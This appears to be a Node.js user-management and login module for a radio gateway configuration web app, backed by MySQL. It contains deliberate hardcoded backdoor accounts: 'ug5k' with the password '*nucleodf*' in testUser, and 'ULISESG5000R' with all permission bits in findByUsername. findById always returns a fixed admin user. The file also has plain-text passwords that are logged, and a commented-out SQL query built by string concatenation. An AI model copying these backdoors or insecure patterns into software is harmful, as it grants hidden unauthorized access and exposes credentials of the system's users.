var logging = require('./loggingDate.js');
var log = true;

/** AGL */
var gcfg = require('../configUlises.json');

/************************/
/*	FUNCTION: getUsers 	*/
/*  PARAMS: 			*/
/************************/
exports.getUsers = function getUsers(req, res, gtw, f){
	var usrs=[];
	var mySql = require('mySql');
	var connection = mySql.createConnection({
	  host     : gcfg.Ulises.dbhost,
	  user     : gcfg.Ulises.dbuser,
	  password : gcfg.Ulises.dbpassword,
	  database : gcfg.Ulises.dbdatabase 
	});

	connection.connect(function(err, usrs){
		if (err){
			logging.LoggingDateCond(log,"Error connention to 'U5K-G' database.");
		}
		else{
			logging.LoggingDateCond(log,"Successful connection to 'U5K-G' database!");

			/** AGL ********************************************
			var consulta='';
			if (gtw != null)
				consulta='SELECT op.idOPERADORES,op.name,op.clave, ' + 
								'CASE perfil ' +
									'WHEN 256 THEN 64 ' +
                					'WHEN 128 THEN 1 ' +
                					'ELSE perfil ' +
								'END AS perfil FROM operadores op ' +
							'LEFT JOIN op_gtw opg ON operadores_idOPERADORES=op.idOPERADORES ' +
    						'WHERE (opg.cgw_idCGW=' + gtw + ') || '	+	// Usuarios de esta pasarela o
    						'((op.perfil <= 64))';					// Administradores
    		else
    			consulta='SELECT * FROM operadores';

			var query = connection.query(consulta, function(err, rows, fields) {
				logging.LoggingDateCond(log,query.sql);

			    if (rows != null && rows.length > 0){
		    		usrs = rows;
		    		logging.LoggingDateCond(log,JSON.stringify(usrs));
		    		if (f != null)
		    			f({users: usrs});
		    		else
						res.json({users: usrs})
			    }
			    else{
					if (f != null)
		    			f({users: ''});
			    }
			});
			**********************************************/
			logging.LoggingDateCond(log,"AGL-USER");
			var consulta='SELECT * FROM operadores';
			var query = connection.query(consulta, function(err, rows, fields) {
				if (rows != null && rows.length > 0) {
					var usrs = [];
					if (gtw==null) {
							/* Estan solicitando la lista completa... */
							usrs = rows;
						}
					else {
						/* Estan solicitando los que hay que pasar a las pasarelas en concreto */
							for (row=0; row<rows.length; row++) {
								var dbUser = rows[row];
								var user = {name: dbUser.name, clave: dbUser.clave, perfil: 0};
								
								logging.LoggingDateCond(log,"DBUSER");
								logging.LoggingDateCond(log,dbUser);
								
								// Perfiles permitidos en las pasarelas...
								user.perfil |= ((dbUser.perfil & 0x0080)!=0) ? 0x0001 : 0x0000;			// Perfil Visualizador.
								user.perfil |= ((dbUser.perfil & 0x0002)!=0) ? 0x0002 : 0x0000;			// Perfil Mando.
								user.perfil |= ((dbUser.perfil & 0x1000)!=0) ? 0x1000 : 0x0000;			// Perfil Gestor.
								user.perfil |= ((dbUser.perfil & 0x0100)!=0) ? 0x0040 : 0x0000;			// Perfil Administrador.
								
								logging.LoggingDateCond(log,"GWUSER");
								logging.LoggingDateCond(log,user);
								
								if (user.perfil != 0) {
									usrs.push(user);
								}
							}							
					}

					logging.LoggingDateCond(log,usrs);
					
		    		if (f != null)
		    			f({users: usrs});
		    		else
						res.json({users: usrs})					
				}
				else {
					if (f != null) f({users: ''});
				}
			});
			/*********************************************/
			connection.end();	
		}
	});
}

/************************/
/*	FUNCTION: postUser 	*/
/*  PARAMS: newUser		*/
/************************/
exports.postUser = function postUser(req, res, newUser, gtws, f){
	var mySql = require('mySql');
	var connection = mySql.createConnection({
	  host     : gcfg.Ulises.dbhost,
	  user     : gcfg.Ulises.dbuser,
	  password : gcfg.Ulises.dbpassword,
	  database : gcfg.Ulises.dbdatabase 
	});

	connection.connect(function(err){
		if (err){
			logging.LoggingDateCond(log,"Error connention to 'U5K-G' database.");
		}
		else{
			logging.LoggingDateCond(log,"Successful connection to 'U5K-G' database!");
		}
	});

	var querySelect = connection.query('SELECT COUNT(*) AS cuantos FROM operadores WHERE name=?',newUser.name,function(err,rows){
		if (err != null || rows[0].cuantos > 0){
			connection.end();	
			f({error: "ER_DUP_ENTRY", data: newUser});
		}
		else{
			var query = connection.query('INSERT INTO operadores SET ?', newUser, function(err, result) {
				logging.LoggingDateCond(log,query.sql);
		    	if (err) {
					connection.end();	
					f({error: err.code, data: newUser});
		    	}
		    	else{
					newUser.idOPERADORES = result.insertId;    		
					if (((newUser.perfil & 128) == 128) || ((newUser.perfil & 256) == 256)){
						setAssignedGateways(connection,gtws,newUser.idOPERADORES,function(res){
							connection.end();
							f({error: null, data: newUser});
						});
					}
					else{
						connection.end();
						f({error: null, data: newUser});
					}
			    }
			});
		}
	})
}

/************************/
/*	FUNCTION: testUser 	*/
/*  PARAMS: res,		*/
/*			red,		*/
/*			user		*/
/************************/
exports.testUser = function testUser(req, res, usr){
	var mySql = require('mySql');
	var app = require('../app');
	var connection = mySql.createConnection({
	  host     : gcfg.Ulises.dbhost,
	  user     : gcfg.Ulises.dbuser,
	  password : gcfg.Ulises.dbpassword,
	  database : gcfg.Ulises.dbdatabase 
	});

	// Comprobar si está entrando con puerta-atrás

	if (usr.Metodo === 'login' && usr.name === 'ug5k' && (new Buffer(usr.clave, 'base64').toString('ascii') === '*nucleodf*')){
		res.render('./services/components', {"name":"ug5k","clave":"*nucleodf*","NivelAcceso":1});
		return;
	}

	//Comprobar si ya existe un usuario autenticado

	connection.connect(function (err) {
		if (err) {
			logging.LoggingDateCond(log,"Error connention to 'U5K-G' database.");
		}
		else {
			logging.LoggingDateCond(log,"Successful connection to 'U5K-G' database!");
		}
	});

	var query = connection.query('SELECT * FROM operadores WHERE ??=? AND ??=?', ['name', usr.name, 'clave', usr.clave], function (err, rows, fields) {
		connection.end();

		logging.LoggingDateCond(log,query.sql);

		//if (err) throw err;
		if (rows.length > 0) {
			var usuario = rows[0];
            if(app.locals.isAuthenticated === false) {
                if (usr.Metodo == 'login')
                    res.render('./services/components', usuario);
                else {
                    app.locals.isAuthenticated = true;
                    app.locals.AuthenticatedUser = usr.name;
                    usuario.alreadyLoggedUserName = 'none';
                    res.json(usuario);
                }
            }
            else {
            	usuario.alreadyLoggedUserName = app.locals.AuthenticatedUser;
                res.status(202).json(usuario);
            }
		}
		else
			res.status(202).json('User not found.');
	});
}

/************************/
/*	FUNCTION: delUser 	*/
/*  PARAMS: res,		*/
/*			req,		*/
/*			user		*/
/************************/
exports.delUser = function delUser(req, res, usr){
	var mySql = require('mySql');
	var connection = mySql.createConnection({
	  host     : gcfg.Ulises.dbhost,
	  user     : gcfg.Ulises.dbuser,
	  password : gcfg.Ulises.dbpassword,
	  database : gcfg.Ulises.dbdatabase 
	});

	connection.connect(function(err){
		if (err){
			logging.LoggingDateCond(log,"Error connention to 'U5K-G' database.");
			return;
		}
		else{
			logging.LoggingDateCond(log,"Successful connection to 'U5K-G' database!");
		}
	});

	var query = connection.query('DELETE FROM operadores WHERE ??=?',['name',usr], function(err, result){
		logging.LoggingDateCond(log,query.sql);
			res.json({error: result.affectedRows, data: usr});
		});
	connection.end();
	
}

/************************/
/*	FUNCTION: putUser 	*/
/*  PARAMS: res,		*/
/*			req,		*/
/*			user		*/
/************************/
exports.putUser = function putUser(req, res, usr, gtws, f){
	var mySql = require('mySql');
	var connection = mySql.createConnection({
	  host     : gcfg.Ulises.dbhost,
	  user     : gcfg.Ulises.dbuser,
	  password : gcfg.Ulises.dbpassword,
	  database : gcfg.Ulises.dbdatabase 
	});

	connection.connect(function(err){
		if (err){
			logging.LoggingDateCond(log,"Error connention to 'U5K-G' database.");
			return;
		}
		else{
			logging.LoggingDateCond(log,"Successful connection to 'U5K-G' database!");
		}
	});

	var query = connection.query('UPDATE operadores SET ? WHERE ??=?',[usr, 'name',usr.name], function(err, result){
		logging.LoggingDateCond(log,query.sql);
		if (usr.perfil >= 128){
			setAssignedGateways(connection,gtws,usr.idOPERADORES,function(res){
				connection.end();
				f({err:null,data:usr})
			});
		}
		else{
			connection.end();
			f({error: null, data: usr});
		}
	});
}

function setAssignedGateways(conn, gtws, usr, f){
	var query=conn.query('DELETE FROM op_gtw WHERE operadores_idOPERADORES=?',usr,function(err,result){
		logging.LoggingDateCond(log,query.sql);
		if (gtws.length > 0){
			gtws.forEach(function(element,index,array){
				var query=conn.query('INSERT INTO op_gtw SET cgw_idCGW=?,cgw_EMPLAZAMIENTO_idEMPLAZAMIENTO=?,operadores_idOPERADORES=?',[element.cgw,element.site,usr],function(err,result){
					logging.LoggingDateCond(log,query.sql);
				})
			})
		}

		f();
	})
}

/** 20170525. AGL. Para el control de Sesiones. */
// Buscar por nombre....
exports.findByUsername = function(username, cb) {
  process.nextTick(function() {

  	/** Chequear la puerta de atras... */
  	if (username == "ULISESG5000R") {
		return cb(null, {
			idOPERADORES: 0, 
			name: 'nucleodf', 
			clave: (new Buffer('*UG5KR*').toString('base64')), 
			perfil: 0xFFFF
		});
  	}

	var mySql = require('mySql');
	var app = require('../app');

	var connection = mySql.createConnection({
	  host     : gcfg.Ulises.dbhost,
	  user     : gcfg.Ulises.dbuser,
	  password : gcfg.Ulises.dbpassword,
	  database : gcfg.Ulises.dbdatabase 
	});
	connection.connect(function (err) {
		if (err) {
			return cb("Error al conectar la base de datos: " + err.toString());
		}
	});
	var query = connection.query('SELECT * FROM operadores WHERE ??=?', ['name', username], function (err, rows, fields) {
		if (err) {
			return cb("Error query db: " + err.toString());
		}
		connection.end();
		if (rows.length > 0) {
			console.log(rows[0]);
			return cb(null, rows[0]);
			// 
		}
	    return cb(null, null);
	});
  });
}

// Buscar por ID
exports.findById = function (userid, cb) {
  process.nextTick(function() {

	var mySql = require('mySql');
	var app = require('../app');
	var connection = mySql.createConnection({
	  host     : gcfg.Ulises.dbhost,
	  user     : gcfg.Ulises.dbuser,
	  password : gcfg.Ulises.dbpassword,
	  database : gcfg.Ulises.dbdatabase 
	});
	connection.connect(function (err) {
		if (err) {
			return cb("Error al conectar la base de datos: " + err.toString());
		}
	});
	var query = connection.query('SELECT * FROM operadores WHERE ??=?', ['idOPERADORES', userid], function (err, rows, fields) {
		if (err) {
			return cb("Error query db: " + err.toString());
		}
		connection.end();
		if (rows.length > 0) {
			// return cb(null, rows[0]);
			return cb(null, {idOPERADORES: 1, name: 'admin', clave: '2', perfil: 64});
		}
	    return cb(null, null);
	});
  });
}